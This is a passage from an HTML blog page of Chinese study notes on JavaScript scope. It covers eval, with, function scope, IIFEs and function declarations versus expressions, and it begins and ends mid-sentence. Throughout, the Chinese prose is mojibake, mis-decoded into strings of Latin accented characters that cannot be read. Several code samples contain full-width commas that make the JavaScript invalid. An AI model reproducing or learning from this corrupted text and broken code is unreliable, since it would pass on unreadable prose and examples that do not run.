ä½œç”¨åŸŸæŸ¥æ‰¾å§‹ç»ˆä»è¿è¡Œæ—¶æ‰€å¤„çš„æœ€å†…éƒ¨ä½œç”¨åŸŸå¼€å§‹ï¼Œé€çº§å‘å¤–æˆ–è€…è¯´å‘ä¸Šè¿›è¡Œï¼Œç›´åˆ°é‡è§ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ ‡è¯†ç¬¦ä¸ºæ­¢ã€‚</p><p><strong>æ³¨æ„:</strong></p><ul><li>å…¨å±€å˜é‡ä¼šè‡ªåŠ¨æˆä¸ºå…¨å±€å¯¹è±¡(æ¯”å¦‚æµè§ˆå™¨ä¸­çš„ windowå¯¹è±¡)çš„å±æ€§ï¼Œå› æ­¤å¯ä»¥ä¸ç›´æ¥é€šè¿‡å…¨å±€å¯¹è±¡çš„è¯æ³•åç§°ï¼Œè€Œæ˜¯é—´æ¥åœ°é€šè¿‡å¯¹å…¨å±€å¯¹è±¡å±æ€§çš„å¼• ç”¨æ¥å¯¹å…¶è¿›è¡Œè®¿é—®ã€‚ä¾‹å¦‚:<code>window.a</code>  ã€‚é€šè¿‡è¿™ç§æŠ€æœ¯å¯ä»¥è®¿é—®é‚£äº›è¢«åŒåå˜é‡æ‰€é®è”½çš„å…¨å±€å˜é‡ã€‚ä½†éå…¨å±€çš„å˜é‡å¦‚æœè¢«é®è”½äº†ï¼Œæ— è®ºå¦‚ä½•éƒ½æ— æ³•è¢«è®¿é—®åˆ°ã€‚</li><li>è¯æ³•ä½œç”¨åŸŸæŸ¥æ‰¾åªä¼šæŸ¥æ‰¾ä¸€çº§æ ‡è¯†ç¬¦ï¼Œæ¯”å¦‚ aã€b å’Œ cã€‚<strong>å¦‚æœä»£ç ä¸­å¼•ç”¨äº† foo.bar.bazï¼Œè¯æ³•ä½œç”¨åŸŸæŸ¥æ‰¾åªä¼šè¯•å›¾æŸ¥æ‰¾ foo æ ‡è¯†ç¬¦</strong>ï¼Œæ‰¾åˆ°è¿™ä¸ªå˜é‡åï¼Œå¯¹è±¡å±æ€§è®¿é—®è§„åˆ™ä¼šåˆ†åˆ«æ¥ç®¡å¯¹ bar å’Œ baz å±æ€§çš„è®¿é—®ã€‚</li></ul><h3 id="2-2-æ¬ºéª—è¯æ³•"><a href="#2-2-æ¬ºéª—è¯æ³•" class="headerlink" title="2.2 æ¬ºéª—è¯æ³•"></a>2.2 æ¬ºéª—è¯æ³•</h3><p><strong>æ¬ºéª—è¯æ³•:</strong> å¼•æ“åœ¨è¿è¡Œæ—¶æ¥â€œä¿®æ”¹â€(ä¹Ÿå¯ä»¥è¯´æ¬ºéª—)è¯æ³•ä½œç”¨åŸŸã€‚<strong>æ¬ºéª—è¯æ³•çš„ä¸¤ç§æœºåˆ¶:</strong></p><h4 id="2-2-1-eval"><a href="#2-2-1-eval" class="headerlink" title="2.2.1 eval"></a>2.2.1 eval</h4><p>JavaScript ä¸­çš„ eval(..) å‡½æ•°å¯ä»¥æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ä¸ºå‚æ•°ï¼Œå¹¶å°†å…¶ä¸­çš„å†…å®¹è§†ä¸ºå¥½åƒåœ¨ä¹¦å†™æ—¶å°±å­˜åœ¨äºç¨‹åºä¸­è¿™ä¸ªä½ç½®çš„ä»£ç ã€‚å³å°†evalæ”¾åœ¨è¯¥è¯æ³•ä½œç”¨åŸŸï¼Œç„¶åevalæºå¸¦çš„ä»£ç å°±ä¼šåŠ¨æ€åŠ å…¥åˆ°è¯¥è¯æ³•ä½œç”¨åŸŸã€‚</p><p>é€šè¿‡ä¸‹é¢çš„ä¾‹å­åŠ æ·±ç†è§£:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">strï¼Œ a</span>) </span>&#123; </span><br><span class="line">  <span class="built_in">eval</span>( str ); <span class="comment">// æ¬ºéª—! </span></span><br><span class="line">  <span class="built_in">console</span>.log( aï¼Œ b );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line">foo( <span class="string">&quot;var b = 3;&quot;</span>ï¼Œ <span class="number">1</span> ); <span class="comment">// 1ï¼Œ 3</span></span><br></pre></td></tr></table></figure><p>eval(..) è°ƒç”¨ä¸­çš„ â€œvar b = 3;â€ è¿™æ®µä»£ç ä¼šè¢«å½“ä½œæœ¬æ¥å°±åœ¨é‚£é‡Œä¸€æ ·æ¥å¤„ç†ã€‚ç”±äºé‚£æ®µä»£ç å£°æ˜äº†ä¸€ä¸ªæ–°çš„å˜é‡ bï¼Œå› æ­¤å®ƒå¯¹å·²ç»å­˜åœ¨çš„ foo(..) çš„è¯æ³•ä½œç”¨åŸŸè¿›è¡Œäº†ä¿®æ”¹ã€‚å½“ console.log(..) è¢«æ‰§è¡Œæ—¶ï¼Œä¼šåœ¨ foo(..) çš„å†…éƒ¨åŒæ—¶æ‰¾åˆ° a å’Œ bï¼Œä½†æ˜¯æ°¸è¿œä¹Ÿæ— æ³•æ‰¾åˆ°å¤–éƒ¨çš„ bã€‚å› æ­¤ä¼šè¾“å‡ºâ€œ1ï¼Œ 3â€è€Œä¸æ˜¯æ­£å¸¸æƒ…å†µä¸‹ä¼šè¾“å‡ºçš„â€œ1ï¼Œ 2â€ã€‚</p><p><strong>æ³¨æ„:</strong> </p><ul><li>eval(..) é€šå¸¸è¢«ç”¨æ¥æ‰§è¡ŒåŠ¨æ€åˆ›å»ºçš„ä»£ç ï¼Œå¯ä»¥æ®ç¨‹åºé€»è¾‘åŠ¨æ€åœ°å°†å˜é‡å’Œå‡½æ•°ä»¥å­—ç¬¦å½¢å¼æ‹¼æ¥åœ¨ä¸€èµ·ä¹‹åä¼ é€’è¿›å»ã€‚</li><li>åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œeval(..) åœ¨è¿è¡Œæ—¶æœ‰å…¶è‡ªå·±çš„è¯æ³•ä½œç”¨åŸŸï¼Œæ„å‘³ç€å…¶ ä¸­çš„å£°æ˜æ— æ³•ä¿®æ”¹æ‰€åœ¨çš„ä½œç”¨åŸŸã€‚</li><li>ä¸eval(â€¦)ç±»ä¼¼ï¼ŒsetTimeout(..)å’Œ setInterval(..) çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²çš„å†…å®¹å¯ä»¥è¢«è§£é‡Šä¸ºä¸€æ®µåŠ¨æ€ç”Ÿæˆçš„å‡½æ•°ä»£ç ã€‚ï¼ˆä¸æå€¡ï¼‰</li><li>new Function(..) å‡½æ•°çš„è¡Œä¸ºä¹Ÿå¾ˆç±»ä¼¼ï¼Œæœ€åä¸€ä¸ªå‚æ•°å¯ä»¥æ¥å—ä»£ç å­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è½¬åŒ–ä¸ºåŠ¨æ€ç”Ÿæˆçš„å‡½æ•°(å‰é¢çš„å‚æ•°æ˜¯è¿™ä¸ªæ–°ç”Ÿæˆçš„å‡½æ•°çš„å½¢å‚)ã€‚è¿™ç§æ„å»ºå‡½æ•°çš„è¯­æ³•æ¯” eval(..) ç•¥å¾®å®‰å…¨ä¸€äº›ï¼Œä½†ä¹Ÿè¦å°½é‡é¿å…ä½¿ç”¨ã€‚</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sum = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">&quot;a&quot;</span>ï¼Œ <span class="string">&quot;b&quot;</span>ï¼Œ <span class="string">&quot;return a + b;&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sum(<span class="number">1</span>ï¼Œ <span class="number">1111</span>));  <span class="comment">//1112</span></span><br></pre></td></tr></table></figure><h4 id="2-2-2-with-ä¸æ¨èå®é™…ä½¿ç”¨"><a href="#2-2-2-with-ä¸æ¨èå®é™…ä½¿ç”¨" class="headerlink" title="2.2.2 with(ä¸æ¨èå®é™…ä½¿ç”¨)"></a>2.2.2 with(ä¸æ¨èå®é™…ä½¿ç”¨)</h4><p>ä¾‹å­:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">obj</span>) </span>&#123; </span><br><span class="line">  <span class="keyword">with</span> (obj) &#123;</span><br><span class="line">    a = <span class="number">2</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o1 = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o2 = &#123; </span><br><span class="line">  <span class="attr">b</span>: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line">foo( o1 );</span><br><span class="line"><span class="built_in">console</span>.log( o1.a ); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">foo( o2 );</span><br><span class="line"><span class="built_in">console</span>.log( o2.a ); <span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2â€”â€”ä¸å¥½ï¼Œa è¢«æ³„æ¼åˆ°å…¨å±€ä½œç”¨åŸŸä¸Šäº†!</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬å°† o1 ä¼ é€’è¿›å»ï¼Œaï¼2 èµ‹å€¼æ“ä½œæ‰¾åˆ°äº† o1.a å¹¶å°† 2 èµ‹å€¼ç»™å®ƒï¼Œè¿™åœ¨åé¢çš„ console. log(o1.a) ä¸­å¯ä»¥ä½“ç°ã€‚è€Œå½“ o2 ä¼ é€’è¿›å»ï¼Œo2 å¹¶æ²¡æœ‰ a å±æ€§ï¼Œå› æ­¤ä¸ä¼šåˆ›å»ºè¿™ä¸ªå±æ€§ï¼Œ o2.a ä¿æŒ undefinedã€‚ä½†æ˜¯ï¼Œä¸ºä»€ä¹ˆæœ€åconsole.log(a)ä¼šä¸º2ï¼Ÿå› ä¸ºåœ¨æ‰§è¡Œfoo(o2)æ—¶ï¼Œwithä¼šå¯¹å…¶ä¸­çš„a=2è¿›è¡ŒLHSæŸ¥è¯¢ï¼Œä½†å®ƒåœ¨o2ä½œç”¨åŸŸï¼Œfoo()ä½œç”¨åŸŸï¼Œå…¨å±€ä½œç”¨åŸŸéƒ½æ²¡æ‰¾åˆ°ï¼Œå› æ­¤å°±åˆ›å»ºäº†ä¸€ä¸ªå…¨å±€å˜é‡aå¹¶éšåèµ‹å€¼2ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œwithå°±æ˜¯å°†ä¸€ä¸ªæ²¡æœ‰æˆ–æœ‰å¤šä¸ªå±æ€§çš„å¯¹è±¡å¤„ç†ä¸ºä¸€ä¸ªå®Œå…¨éš”ç¦»çš„è¯æ³•ä½œç”¨åŸŸï¼Œå› æ­¤è¿™ä¸ªå¯¹è±¡çš„å±æ€§ä¹Ÿä¼šè¢«å¤„ç†ä¸ºå®šä¹‰åœ¨è¿™ä¸ªä½œç”¨åŸŸä¸­çš„è¯æ³•æ ‡è¯†ç¬¦ã€‚</p><p><strong>æ³¨æ„:</strong> ä½¿ç”¨ eval(..) å’Œ with çš„åŸå› æ˜¯ä¼šè¢«ä¸¥æ ¼æ¨¡å¼æ‰€å½±å“(é™åˆ¶)ã€‚with è¢«å®Œå…¨ç¦æ­¢ï¼Œè€Œåœ¨ä¿ç•™æ ¸å¿ƒåŠŸèƒ½çš„å‰æä¸‹ï¼Œé—´æ¥æˆ–éå®‰å…¨åœ°ä½¿ç”¨ eval(..) ä¹Ÿè¢«ç¦æ­¢äº†ã€‚</p><h4 id="2-2-3-æ€§èƒ½"><a href="#2-2-3-æ€§èƒ½" class="headerlink" title="2.2.3 æ€§èƒ½"></a>2.2.3 æ€§èƒ½</h4><p>JavaScript å¼•æ“ä¼šåœ¨ç¼–è¯‘é˜¶æ®µè¿›è¡Œæ•°é¡¹çš„æ€§èƒ½ä¼˜åŒ–ã€‚å…¶ä¸­æœ‰äº›ä¼˜åŒ–ä¾èµ–äºèƒ½å¤Ÿæ ¹æ®ä»£ç çš„è¯æ³•è¿›è¡Œ<strong>é™æ€åˆ†æ</strong>ï¼Œå¹¶<strong>é¢„å…ˆç¡®å®š</strong>æ‰€æœ‰å˜é‡å’Œå‡½æ•°çš„å®šä¹‰ä½ç½®ï¼Œæ‰èƒ½åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¿«é€Ÿæ‰¾åˆ°æ ‡è¯†ç¬¦ã€‚ä½†æ˜¯eval(..) å’Œ withä¼šåœ¨è¿è¡Œæ—¶ä¿®æ”¹æˆ–åˆ›å»ºæ–°çš„ä½œç”¨åŸŸï¼Œä»¥æ­¤æ¥æ¬ºéª—å…¶ä»–åœ¨ä¹¦å†™æ—¶å®šä¹‰çš„è¯æ³•ä½œç”¨åŸŸã€‚è¿™ä¹ˆåšå°±ä¼šå¯¼è‡´å¼•æ“æ— æ³•çŸ¥é“evalå’Œwithå®ƒä»¬å¯¹è¯æ³•ä½œç”¨åŸŸè¿›è¡Œä»€ä¹ˆæ ·çš„æ”¹åŠ¨.åªèƒ½å¯¹éƒ¨åˆ†ä¸è¿›è¡Œå¤„ç†å’Œä¼˜åŒ–ã€‚å› æ­¤å¦‚æœä»£ç ä¸­å¤§é‡ä½¿ç”¨ eval(..) æˆ– withï¼Œé‚£ä¹ˆè¿è¡Œèµ·æ¥ä¸€å®šä¼šå˜å¾—éå¸¸æ…¢ã€‚</p><h3 id="2-3-å°ç»“"><a href="#2-3-å°ç»“" class="headerlink" title="2.3 å°ç»“"></a>2.3 å°ç»“</h3><ul><li>è¯æ³•ä½œç”¨åŸŸæ˜¯åœ¨ä½ ä¹¦å†™ä»£ç æ—¶å°±å·²ç»å†³å®šäº†çš„ã€‚åœ¨ç¼–è¯‘çš„ç¬¬ä¸€é˜¶æ®µè¯æ³•åˆ†æé˜¶æ®µäº§ç”Ÿè¯æ³•ä½œç”¨åŸŸï¼Œæ­¤æ—¶è¯æ³•ä½œç”¨åŸŸåŸºæœ¬èƒ½å¤ŸçŸ¥é“å…¨éƒ¨æ ‡è¯†ç¬¦åœ¨å“ªé‡Œä»¥åŠæ˜¯å¦‚ä½•å£°æ˜çš„ï¼Œä»è€Œèƒ½å¤Ÿé¢„æµ‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¦‚ä½•å¯¹å®ƒä»¬è¿›è¡ŒæŸ¥æ‰¾ã€‚</li><li>eval(..) å’Œ withã€‚å‰è€…å¯ä»¥å¯¹ä¸€æ®µåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå£°æ˜çš„â€œä»£ç â€å­—ç¬¦ä¸²è¿›è¡Œæ¼”ç®—ï¼Œå¹¶å€Ÿæ­¤æ¥ä¿®æ”¹å·²ç»å­˜åœ¨çš„è¯æ³•ä½œç”¨åŸŸ(åœ¨è¿è¡Œæ—¶)ã€‚åè€…æœ¬è´¨ä¸Šæ˜¯é€šè¿‡å°†ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨å½“ä½œä½œç”¨åŸŸæ¥å¤„ç†ï¼Œå°†å¯¹è±¡çš„å±æ€§å½“ä½œä½œç”¨åŸŸä¸­çš„æ ‡è¯†ç¬¦æ¥å¤„ç†ï¼Œä»è€Œåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„è¯æ³•ä½œç”¨åŸŸ(åŒæ ·æ˜¯åœ¨è¿è¡Œæ—¶)ã€‚</li><li>ä¸€èˆ¬ä¸è¦åœ¨å®é™…ä»£ç ä¸­ä½¿ç”¨eval(â€¦)å’Œwithï¼Œå› ä¸ºä¸ä»…å±é™©ï¼Œè€Œä¸”ä¼šé€ æˆæ€§èƒ½é—®é¢˜!</li></ul><h2 id="ç¬¬ä¸‰ç« -å‡½æ•°ä½œç”¨åŸŸå’Œå—ä½œç”¨åŸŸ"><a href="#ç¬¬ä¸‰ç« -å‡½æ•°ä½œç”¨åŸŸå’Œå—ä½œç”¨åŸŸ" class="headerlink" title="ç¬¬ä¸‰ç«  å‡½æ•°ä½œç”¨åŸŸå’Œå—ä½œç”¨åŸŸ"></a>ç¬¬ä¸‰ç«  å‡½æ•°ä½œç”¨åŸŸå’Œå—ä½œç”¨åŸŸ</h2><h3 id="3-1-å‡½æ•°ä¸­çš„ä½œç”¨åŸŸ"><a href="#3-1-å‡½æ•°ä¸­çš„ä½œç”¨åŸŸ" class="headerlink" title="3.1 å‡½æ•°ä¸­çš„ä½œç”¨åŸŸ"></a>3.1 å‡½æ•°ä¸­çš„ä½œç”¨åŸŸ</h3><ul><li>JavaScript å…·æœ‰åŸºäºå‡½æ•°çš„ä½œç”¨åŸŸï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ¯å£°æ˜ä¸€ä¸ªå‡½æ•°éƒ½ä¼šåˆ›å»ºä¸€ä¸ªå‡½æ•°ä½œç”¨åŸŸ.</li><li>å‡½æ•°ä½œç”¨åŸŸçš„å«ä¹‰æ˜¯æŒ‡ï¼Œå±äºè¿™ä¸ªå‡½æ•°çš„å…¨éƒ¨å˜é‡éƒ½å¯ä»¥åœ¨æ•´ä¸ªå‡½æ•°çš„èŒƒå›´å†…ä½¿ç”¨åŠå¤ç”¨(äº‹å®ä¸Šåœ¨åµŒå¥—çš„ä½œç”¨åŸŸä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨)ã€‚è¿™æ ·çš„å¥½å¤„æ˜¯JavaScript å˜é‡å¯ä»¥æ ¹æ®éœ€è¦æ”¹å˜å€¼ç±»å‹ã€‚</li></ul><h3 id="3-2-éšè—å†…éƒ¨å®ç°"><a href="#3-2-éšè—å†…éƒ¨å®ç°" class="headerlink" title="3.2 éšè—å†…éƒ¨å®ç°"></a>3.2 éšè—å†…éƒ¨å®ç°</h3><p>å› ä¸º</p><ul><li>å­çº§å‡½æ•°ä½œç”¨åŸŸå¯ä»¥ç›´æ¥è®¿é—®çˆ¶çº§å‡½æ•°ä½œç”¨åŸŸé‡Œçš„æ ‡è¯†ç¬¦;</li><li>çˆ¶çº§å‡½æ•°ä½œç”¨åŸŸä¸èƒ½ç›´æ¥è®¿é—®å­çº§å‡½æ•°ä½œç”¨åŸŸé‡Œçš„æ ‡è¯†ç¬¦.</li></ul><p>æ‰€ä»¥ç”¨å‡½æ•°å£°æ˜å¯¹ä»£ç è¿›è¡ŒåŒ…è£…ï¼Œå®é™…ä¸Šå°±æ˜¯æŠŠè¿™äº›ä»£ç â€œéšè—â€èµ·æ¥äº†ã€‚</p><p><strong>ä¸ºä»€ä¹ˆè¦å°†ä»£ç è¿›è¡Œâ€éšè—â€ï¼Ÿ</strong>    </p><p>å› ä¸ºæœ€å°æˆæƒæˆ–æœ€å°æš´éœ²åŸåˆ™ã€‚è¿™ä¸ªåŸåˆ™æ˜¯æŒ‡åœ¨è½¯ä»¶è®¾è®¡ä¸­ï¼Œåº”è¯¥æœ€å°é™åº¦åœ°æš´éœ²å¿… è¦å†…å®¹ï¼Œè€Œå°†å…¶ä»–å†…å®¹éƒ½â€œéšè—â€èµ·æ¥ï¼Œæ¯”å¦‚æŸä¸ªæ¨¡å—æˆ–å¯¹è±¡çš„ API è®¾è®¡ã€‚    </p><p><strong>éšè—çš„å¥½å¤„:</strong></p><ul><li>å®ç°ä»£ç ç§æœ‰åŒ–ï¼Œå‡å°‘å¤–éƒ¨å¯¹å†…éƒ¨ä»£ç çš„å¹²æ‰°ï¼Œä¿æŒå…¶ç¨³å®šæ€§.</li><li><strong>è§„é¿å†²çª:</strong> å¯ä»¥é¿å…åŒåæ ‡è¯†ç¬¦ä¹‹é—´çš„å†²çªï¼Œ ä¸¤ä¸ªæ ‡è¯†ç¬¦å¯èƒ½å…·æœ‰ç›¸åŒçš„åå­—ä½†ç”¨é€”å´ä¸ä¸€æ ·ï¼Œæ— æ„é—´å¯èƒ½é€ æˆå‘½åå†²çªã€‚å†²çªä¼šå¯¼è‡´å˜é‡çš„å€¼è¢«æ„å¤–è¦†ç›–ã€‚é‚£ä¹ˆä¸€èˆ¬è§„é¿å†²çªçš„æ‰‹æ®µæœ‰å“ªäº›ï¼Ÿ<ol><li><strong>å…¨å±€å‘½åç©ºé—´:</strong> å˜é‡å†²çªçš„ä¸€ä¸ªå…¸å‹ä¾‹å­å­˜åœ¨äºå…¨å±€ä½œç”¨åŸŸä¸­ã€‚å½“ç¨‹åºä¸­åŠ è½½äº†å¤šä¸ªç¬¬ä¸‰æ–¹åº“æ—¶ï¼Œå¦‚æœå®ƒä»¬æ²¡æœ‰å¦¥å–„åœ°å°†å†…éƒ¨ç§æœ‰çš„å‡½æ•°æˆ–å˜é‡éšè—èµ·æ¥ï¼Œå°±ä¼šå¾ˆå®¹æ˜“å¼•å‘å†²çªã€‚è¿™äº›åº“é€šå¸¸ä¼šåœ¨å…¨å±€ä½œç”¨åŸŸä¸­å£°æ˜ä¸€ä¸ªåå­—è¶³å¤Ÿç‹¬ç‰¹çš„å˜é‡ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡è¢«ç”¨ä½œåº“çš„å‘½åç©ºé—´ï¼Œæ‰€æœ‰éœ€è¦æš´éœ²ç»™å¤–ç•Œçš„åŠŸèƒ½éƒ½ä¼šæˆä¸ºè¿™ä¸ªå¯¹è±¡(å‘½åç©ºé—´)çš„å±æ€§ï¼Œè€Œä¸æ˜¯å°†è‡ªå·±çš„æ ‡è¯†ç¬¦æš´æ¼åœ¨é¡¶çº§çš„è¯æ³•ä½œç”¨åŸŸä¸­ã€‚ </li><li><strong>æ¨¡å—ç®¡ç†:</strong> å¦å¤–ä¸€ç§é¿å…å†²çªçš„åŠæ³•å’Œç°ä»£çš„æ¨¡å—æœºåˆ¶å¾ˆæ¥è¿‘ï¼Œå°±æ˜¯ä»ä¼—å¤šæ¨¡å—ç®¡ç†å™¨ä¸­æŒ‘é€‰ä¸€ä¸ªæ¥ ä½¿ç”¨ã€‚å®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„amdï¼Œcommonjsï¼Œimportæ¨¡å—æœºåˆ¶.</li></ol></li></ul><h3 id="3-3-å‡½æ•°ä½œç”¨åŸŸ"><a href="#3-3-å‡½æ•°ä½œç”¨åŸŸ" class="headerlink" title="3.3 å‡½æ•°ä½œç”¨åŸŸ"></a>3.3 å‡½æ•°ä½œç”¨åŸŸ</h3><p><strong>å‡½æ•°å£°æ˜ä¸å‡½æ•°è¡¨è¾¾å¼:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“å‡½æ•°fooå†…çš„å˜é‡å’Œå‡½æ•°è¢«éšè—èµ·æ¥äº†ï¼Œæ˜¯ä¸ä¼šå¯¹å…¨å±€ä½œç”¨åŸŸé€ æˆæ±¡æŸ“ã€‚ä½†æ˜¯å˜é‡åfooä»ç„¶å­˜åœ¨äºå…¨å±€ä½œç”¨åŸŸä¸­ï¼Œä¼šé€ æˆæ±¡æŸ“ã€‚é‚£æœ‰ä»€ä¹ˆæ–¹æ³•èƒ½é¿å…å‡½æ•°åçš„æ±¡æŸ“å‘¢ï¼Ÿé‚£å°±æ˜¯<strong>ä½œä¸ºå‡½æ•°è¡¨è¾¾å¼</strong>ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„å‡½æ•°å£°æ˜ã€‚è¿™æ ·å‡½æ•°ååªå­˜åœ¨äºå®ƒè‡ªå·±çš„å‡½æ•°ä½œç”¨åŸŸå†…ï¼Œè€Œä¸ä¼šå­˜åœ¨äºå…¶çˆ¶ä½œç”¨åŸŸï¼Œè¿™æ ·å°±æ²¡æœ‰äº†æ±¡æŸ“ã€‚ä¸¾ä¸ªå‡½æ•°å£°æ˜çš„ä¾‹å­:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">console</span>.log( a ); <span class="comment">// 3 </span></span><br><span class="line">&#125;)(); </span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ç”¨()åŒ…è£¹ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ç«‹å³æ‰§è¡Œã€‚æ­¤æ—¶è¿™ä¸ªåŒ…è£…å‡½æ•°å£°æ˜æ˜¯ä»<code>(function...</code>å¼€å§‹çš„è€Œä¸æ˜¯ä»functionâ€¦å¼€å§‹ã€‚è¿™æ ·fooå°±ä¼šè¢«å½“åšä¸€ä¸ªå‡½æ•°è¡¨è¾¾å¼ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°å£°æ˜(å³fooä¸ä¼šå­˜åœ¨äºçˆ¶çº§ä½œç”¨åŸŸä¸­)ã€‚å›åˆ°ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå…¨å±€ä½œç”¨åŸŸæ˜¯è®¿é—®ä¸åˆ°fooçš„ï¼Œfooåªå­˜åœ¨äºå®ƒè‡ªå·±çš„å‡½æ•°ä½œç”¨åŸŸä¸­ã€‚</p><p><strong>è¡¥å……: ä»€ä¹ˆæ˜¯å‡½æ•°å£°æ˜å’Œå‡½æ•°è¡¨è¾¾å¼</strong>é¦–å…ˆæˆ‘ä»¬å¾—äº†è§£JSå£°æ˜å‡½æ•°çš„ä¸‰ç§æ–¹å¼:</p><ul><li><strong>å‡½æ•°è¡¨è¾¾å¼:</strong>Â å°†å‡½æ•°å®šä¹‰ä¸ºè¡¨è¾¾å¼è¯­å¥çš„ä¸€éƒ¨åˆ†ã€‚é€šè¿‡å‡½æ•°è¡¨è¾¾å¼å®šä¹‰çš„å‡½æ•°å¯ä»¥æ˜¯å‘½åçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒ¿åçš„ã€‚å› ä¸ºå®ƒå¯ä»¥æ²¡æœ‰å‡½æ•°åï¼Œå› æ­¤å¸¸è¢«ç”¨ä½œåŒ¿åå‡½æ•°ã€‚å¦‚æœæœ‰ï¼Œå…¶å‡½æ•°åä¹Ÿåªå­˜åœ¨è‡ªèº«çš„å‡½æ•°ä½œç”¨åŸŸï¼Œå¹¶ä¸”å‡½æ•°è¡¨è¾¾å¼ä¸èƒ½ä»¥â€œfunctionâ€å¼€å¤´ã€‚å‡½æ•°è¡¨è¾¾å¼å¯ä»¥å­˜å‚¨åœ¨å˜é‡æˆ–è€…å¯¹è±¡å±æ€§é‡ŒÂ (åœ¨å‡½æ•°å£°æ˜å‰åŠ ä¸Šè¿ç®—ç¬¦æ˜¯å¯ä»¥å°†å…¶è½¬åŒ–ä¸ºå‡½æ•°è¡¨è¾¾å¼çš„ã€‚ä¾‹å¦‚<code>!</code>ï¼Œ<code>+</code>ï¼Œ<code>-</code>ï¼Œ<code>()</code>.ä¸¾ä¸ªä¾‹å­:<code>!function()&#123;console.log(1)&#125;()</code>çš„ç»“æœæ˜¯1ï¼Œå¹¶ä¸ä¼šæŠ¥é”™)</li><li><strong>å‡½æ•°å£°æ˜:</strong>Â Â å‡½æ•°å£°æ˜æ˜¯ä¸€ç§ç‹¬ç«‹çš„ç»“æ„ï¼Œå®ƒä¼šå£°æ˜ä¸€ä¸ªå…·åå‡½æ•°ï¼Œå¹¶å¿…é¡»ä»¥functionå¼€å¤´ã€‚ä¸”å‡½æ•°å£°æ˜ä¼šè¿›è¡Œå‡½æ•°æå‡ï¼Œä½¿å®ƒèƒ½åœ¨å…¶æ‰€åœ¨ä½œç”¨åŸŸçš„ä»»æ„ä½ç½®è¢«è°ƒç”¨ï¼Œå³åé¢çš„ä»£ç ä¸­å¯ä»¥å°†æ­¤å‡½æ•°é€šè¿‡å‡½æ•°åèµ‹å€¼ç»™å˜é‡æˆ–è€…å¯¹è±¡å±æ€§ã€‚</li><li><strong>Function()æ„é€ å™¨:</strong>Â å³ä½¿ç”¨Functionæ„é€ å™¨åˆ›å»ºå‡½æ•°ã€‚ä¸æ¨èè¿™ç§ç”¨æ³•ï¼Œ å®¹æ˜“å‡ºé—®é¢˜</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Function()æ„é€ å™¨</span></span><br><span class="line"><span class="keyword">var</span> f =<span class="keyword">new</span> <span class="built_in">Function</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°è¡¨è¾¾å¼</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å£°æ˜</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f())</span><br><span class="line"><span class="comment">//1  undefined</span></span><br></pre></td></tr></table></figure><p><strong>æ€ä¹ˆåŒºåˆ†å‡½æ•°å£°æ˜å’Œå‡½æ•°è¡¨è¾¾å¼:</strong><br>çœ‹ function 